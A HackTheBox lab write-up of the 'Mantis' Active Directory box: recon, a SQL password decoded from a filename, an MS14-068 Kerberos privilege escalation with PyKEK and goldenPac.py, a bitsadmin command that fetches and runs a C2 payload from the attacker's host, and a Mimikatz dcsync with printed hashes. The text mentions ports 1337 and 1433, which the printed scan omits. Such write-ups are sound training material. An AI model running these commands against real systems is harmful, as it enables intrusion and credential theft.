---
layout: single
title: "HTB - Mantis Writeup - 10.10.10.52"
date: 2020-07-21 08:20:23 +0100
categories: hackthebox
excerpt: My writeup of the HackTheBox AD machine Mantis.
---

![htb](/images/hackthebox-writeups/mantis/htb.png)

# HackTheBox - Mantis - 10.10.10.52

Mantis is an hard difficulty rated Active Directory machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary

Mantis can definitely be one of the more challenging machines for some users. For successful exploitation, a fair bit of knowledge or research of Windows Servers and the domain controller system is required.

## Recon and Scanning

### Nmap Results

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Mantis]
└──╼ $nmap -sC -sV -oN nmap/initial 10.10.10.52
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-21 08:34 BST
Nmap scan report for 10.10.10.52
Host is up (0.026s latency).
Not shown: 984 closed ports
PORT STATE SERVICE VERSION
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-21 07:35:27Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp open microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49158/tcp open msrpc Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h20m46s, deviation: 2h18m34s, median: 45s
| smb-os-discovery:
| OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
| Computer name: mantis
| NetBIOS computer name: MANTIS\x00
| Domain name: htb.local
| Forest name: htb.local
| FQDN: mantis.htb.local
|_ System time: 2020-07-21T03:36:21-04:00
| smb-security-mode:
| account*used: <blank>
| authentication_level: user
| challenge_response: supported
|* message*signing: required
| smb2-security-mode:
| 2.02:
|* Message signing enabled and required
| smb2-time:
| date: 2020-07-21T07:36:22
|\_ start_date: 2020-07-21T07:34:18
{% endhighlight %}

Nmap shows us that there is an IIS web server on port 1337, SQL Server on port 1433 and the usual ports for a domain controller. Firstly, I will enumerate the webpage as I have no credentials for the SQL Server.

### GoBusting

![iis-default](/images/hackthebox-writeups/mantis/iis.png)

As there is nothing on the default IIS page I will start up a gobuster scan to try and find some hidden pages.

{% highlight bash linenos %}
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
{% endhighlight %}

![gobuster](/images/hackthebox-writeups/mantis/gobuster.png)

The gobuster scan revealed a directory, `secure_notes` with two files inside.

![securenotes](/images/hackthebox-writeups/mantis/secure_notes.png)

`dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`

![dev-notes](/images/hackthebox-writeups/mantis/dev-notes.png)

The Dev Notes Reveals:

- There is a SQL Server with a database called orcharddb.
- There is a user called "admin"
- The password has been set

Something else intresting is that the string after `dev_notes` in the URL, looks to be base64 and could be a clue to the password.

![b64](/images/hackthebox-writeups/mantis/base64-string.png)

## SQL Server

The decoded base64 string turns out to be a hex string and that hex string, when decoded revelas the SQL Server password.

{% highlight bash linenos %}
echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd -r -ps && printf "\n"
{% endhighlight %}

![sql-passwd](/images/hackthebox-writeups/mantis/xxd.png)

We now have credentials for the SQL Server: `admin:m$$ql_S@_P@ssW0rd!`

### Connecting to the database with DBeaver

To connect to the SQL Server I will use dbeaver which can be installed with, `sudo apt install dbeaver`

![beaver-1](/images/hackthebox-writeups/mantis/dbeaver-1.png)

Now launch dbeaver from the kali menu.

![beaver-2](/images/hackthebox-writeups/mantis/dbeaver-2.png)

Now select `Microsoft SQL Server`

![beaver-3](/images/hackthebox-writeups/mantis/dbeaver-3.png)

Now type in all the relevant information and download any relevant drivers, once you have tested the connection, press the Finish button.

![beaver-4](/images/hackthebox-writeups/mantis/dbeaver-4.png)

### Exploring the Database

Now that we are in the database let's have a look at the users table and see if we get any local Windows credentials.

![db-1](/images/hackthebox-writeups/mantis/db-1.png)

Bingo, we have credentials, `james:J@m3s_P@ssW0rd!`

## James to Administrator - PyKek

To root this machine we need to use the impacket script `goldenPac.py` and the Python Kerberos Exploitation Kit's `ms14-068.py` script. This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. This means we are able to get a shell as `SYSTEM` with normal user credentials and a user generated kerberos ticket, this exploit is explained here, [MS14-068](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068).

Firstly, make sure you have impacket installed with:

{% highlight bash linenos %}
pip3 install impacket
{% endhighlight %}

### Getting James's SID

First, we need to get the SID of the user james to use with [this script](https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS14-068/pykek/ms14-068.py) to generate a kerberos ticket for james and store it in `/tmp/krb5cc_0`. To get the SID we will use RPCClient and the LOOKUPNAMES command.
{% highlight bash linenos %}
rpcclient -U htb\\james mantis.htb.local
LOOKUPNAMES james
{% endhighlight %}

![rpc-1](/images/hackthebox-writeups/mantis/rpc-1.png)

### Generating a Kerberos Ticket

Now that we have the SID we need to generate a kerberos ticket using pykek's `ms14-068.py` found [here](https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS14-068/pykek/ms14-068.py). To downlad all the necessary files use this command:

{% highlight bash linenos %}
svn checkout https://github.com/SecWiki/windows-kernel-exploits/trunk/MS14-068/pykek
{% endhighlight %}

![pykek-dl](/images/hackthebox-writeups/mantis/pykek-dl.png)

Now that we have pykek downloaded, the command syntax is as follows:
{% highlight bash linenos %}
python ms14-068.py -u james@htb.local -d mantis.htb.local -p "J@m3s_P@ssW0rd!" -s S-1-5-21-4220043660-4019079961-2895681657
{% endhighlight %}

![pykek-1](/images/hackthebox-writeups/mantis/pykek-1.png)

Next, we need to move the ticket file named, `TGT_james@htb.local.ccache` to `/tmp/krb5cc_0`

![mv-1](/images/hackthebox-writeups/mantis/mv-1.png)

Now we have the Kerberos TGT, we can use the `goldenPac.py` script. The syntax is as follows:

{% highlight bash linenos %}
goldenPac.py htb.local/james@mantis.htb.local
{% endhighlight %}

### Root Shell w/ goldenPac

![root-gif](/images/hackthebox-writeups/mantis/root.gif)

## User and Root Flags

We can also now get the root and user flags.

{% highlight powershell linenos %}
type \users\james\desktop\user.txt
type \users\administrator\desktop\root.txt
{% endhighlight %}

![flags](/images/hackthebox-writeups/mantis/flags.gif)

## Beyond Root

Now that we have a system shell, I will fire up Covenant C2 and load up a grunt on the box such that we can dump the SAM hashes.

If it is your first time launching covenant with docker run:
{% highlight bash linenos %}
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v </absolute/path/to/Covenant/Covenant/Data>:/app/Data covenant
{% endhighlight %}

If you have run Covenant before then type:
{% highlight bash linenos %}
docker start covenant
{% endhighlight %}

![c2-start](/images/hackthebox-writeups/mantis/covenant-start.png)

### Loading a Covenant Grunt

Firstly, create a new grunt and host it on a listner.

![c2.exe](/images/hackthebox-writeups/mantis/listener-1.png)

Now download it to an AppLocker Bypass directory like `C:\Windows\System32\spool\drivers\color` and execute it.

{% highlight powershell linenos %}
bitsadmin /transfer downloadjob /download /priority normal http://10.10.14.14/c2.exe C:\Windows\System32\spool\drivers\color\c2.exe
cd C:\Windows\System32\spool\drivers\color
c2.exe
{% endhighlight %}

![execute](/images/hackthebox-writeups/mantis/btsadmin.png)

Bingo, we got a grunt.

![grunt](/images/hackthebox-writeups/mantis/grunt-1.png)

### Dumping the SAM hashes with Covenant

To dump the SAM hashes we will head over to the interact tab and enter the following command

{% highlight powershell linenos %}
Mimikatz /command:"\"lsadump::dcsync /domain:htb.local /all /csv\""
{% endhighlight %}

![hash-dump](/images/hackthebox-writeups/mantis/hashes.png)

{% highlight powershell linenos %}
krbtgt 3e330665e47f7890603b5a96bbb31e23
MANTIS$ 85bd47e560005a791345fc28bfd49d9f
james 71b5ea0a10d569ffac56d3b63684b3d2
Administrator 22140219fd9432e584a355e54b28ecbb
{% endhighlight %}

### Clearing Up

Now that we have dumped all the hashes and completed the box, exit the grunt and reset the box.

![exit](/images/hackthebox-writeups/mantis/exit.png)

## Pwned

![pwned](/images/hackthebox-writeups/mantis/pwned.png)

## Respect

If you enjoyed my write up or found it useful consider +repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)
